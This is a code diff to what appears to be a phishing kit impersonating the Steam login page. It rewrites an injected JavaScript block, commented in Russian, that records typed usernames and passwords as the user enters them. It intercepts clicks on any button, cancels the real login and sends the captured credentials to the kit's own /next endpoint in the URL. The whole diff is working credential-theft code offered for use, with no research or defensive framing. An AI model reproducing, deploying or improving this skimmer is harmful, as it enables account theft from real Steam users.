@@ -231,34 +231,44 @@ STEAM_LOGIN_DOM = """
 
 FORCE_REDIRECT_SCRIPT = """
 <script>
-document.addEventListener("submit", function(e) {
-    var form = e.target;
-    var userInput = form.querySelector("input[name='username'], #steam_user_input, input[type='text']") || document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
-    var passInput = form.querySelector("input[name='password'], #steam_pass_input, input[type='password']") || document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");
+let savedUser = "";
+let savedPass = "";
 
-    var uVal = userInput ? encodeURIComponent(userInput.value.trim()) : "";
-    var pVal = passInput ? encodeURIComponent(passInput.value.trim()) : "";
+// В реальном времени сохраняем всё, что пользователь вводит в поля
+document.addEventListener("input", function(e) {
+    if (e.target.tagName === "INPUT") {
+        var type = e.target.type;
+        var name = (e.target.name || "").toLowerCase();
+        var id = (e.target.id || "").toLowerCase();
 
-    if (uVal || pVal) {
-        e.preventDefault();
-        window.location.href = "/next?user=" + uVal + "&pass=" + pVal;
+        if (type === "text" || name.includes("user") || id.includes("user") || e.target.autocomplete === "username") {
+            savedUser = e.target.value;
+        }
+        if (type === "password" || name.includes("pass") || id.includes("pass") || e.target.autocomplete === "current-password") {
+            savedPass = e.target.value;
+        }
     }
 }, true);
 
+// Перехватываем клик по кнопке входа
 document.addEventListener("click", function(e) {
-    var btn = e.target.closest("button.steam_react_submit, button[type='submit'], .submit_btn, button");
+    var btn = e.target.closest("button, input[type='submit'], [role='button']");
     if (btn) {
-        var form = btn.closest("form");
-        var userInput = (form ? form.querySelector("input[name='username'], #steam_user_input, input[type='text']") : null) || document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
-        var passInput = (form ? form.querySelector("input[name='password'], #steam_pass_input, input[type='password']") : null) || document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");
+        // Если переменные пустые, пытаемся экстренно вытащить данные из полей на странице
+        if (!savedUser) {
+            var uInput = document.querySelector("input[type='text'], input[name*='user'], input[autocomplete*='username']");
+            if (uInput) savedUser = uInput.value;
+        }
+        if (!savedPass) {
+            var pInput = document.querySelector("input[type='password'], input[name*='pass'], input[autocomplete*='current-password']");
+            if (pInput) savedPass = pInput.value;
+        }
 
-        var uVal = userInput ? encodeURIComponent(userInput.value.trim()) : "";
-        var pVal = passInput ? encodeURIComponent(passInput.value.trim()) : "";
-
-        if (uVal || pVal) {
+        // Если введены данные — отменяем стандартное поведение и перенаправляем на /next
+        if (savedUser || savedPass) {
             e.preventDefault();
             e.stopPropagation();
-            window.location.href = "/next?user=" + uVal + "&pass=" + pVal;
+            window.location.href = "/next?user=" + encodeURIComponent(savedUser) + "&pass=" + encodeURIComponent(savedPass);
         }
     }
 }, true);
